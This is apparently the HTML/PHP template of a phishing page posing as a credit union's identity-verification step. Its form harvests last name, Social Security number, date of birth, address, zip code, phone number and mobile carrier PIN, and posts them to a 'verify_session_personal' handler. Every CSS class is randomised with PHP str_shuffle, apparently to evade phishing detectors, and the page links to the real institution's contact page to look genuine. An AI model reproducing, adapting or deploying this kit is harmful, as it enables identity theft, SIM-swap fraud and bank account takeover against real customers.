...
<head>
	...
	<link href="files/app.76ff82e5.css" rel="preload" as="style">
	<link href="files/chunk-vendors.eab46e62.css" rel="preload" as="style">
	<link href="files/chunk-vendors.eab46e62.css" rel="stylesheet">
	<link href="files/app.76ff82e5.css" rel="stylesheet">
...
<body>
								...
								<div data-v-2906dda8="" data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> row">
									<div data-v-2906dda8="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> col-md-5 col-lg-4 col">
										<form data-v-5dcd7cb4="" method="post" action="process/verify_session_personal" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-form" data-v-2906dda8="">
											...
											<div data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
												...
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Last Name" name="lname" required="true" id="lname" type="text">
														</div>
													</div>
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
												...
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Social Security Number" name="ssn" required="true" id="ssn" type="tel">
												...
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Date Of Birth (MM/DD/YYYY)" name="dob" required="true" id="dob" type="tel">
											...
											<div data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Address" name="address" required="true" id="address" type="text">
														</div>
													</div>
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
											...
											<div data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Zip Code"  maxlength="5" name="zip" required="true" id="zip" type="tel">
														</div>
													</div>
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
											...
											<div data-v-dfd49888="" data-v-5dcd7cb4="">
												<div data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-menu">
													<!---->
												</div>
												<div data-v-dfd49888="" id="new-password-wrapper" style="position: relative;">
													<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	<label for="new-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																	<input autocomplete="new-password" name="phone" required="true" placeholder="Phone" id="phone" type="tel">
												...
												<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																<label for="confirm-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																<input autocomplete="new-password" placeholder="Carrier Pin" id="cpin" name="cpin" required="true" type="tel" maxlength="6">
															</div>
											...
											<div data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> mt-4">
												<button data-v-5dcd7cb4="" type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-btn__content">Next</span></button>
												<button data-v-5dcd7cb4="" type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default white"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-btn__content">Cancel</span></button>
											</div>
										</form>
										<p data-v-0934c2df="" data-v-5dcd7cb4="" id="na-question" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-body-2 mt-6" data-v-2906dda8="">Need assistance? <a data-v-0934c2df="" id="na-contact-link" href="https://www.americafirst.com/about/contact/">Contact Us</a></p>
									</div>
									<!---->
								</div>
							</div>
							<div data-v-551af68e="" data-v-282502d4="" role="dialog" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-dialog__container">
								<!---->
							</div>
						</div>
					</div>
	...
	<script src="/js/chunk-vendors.662cf618.js"></script>
	<script src="/js/app.48c40f3c.js"></script>
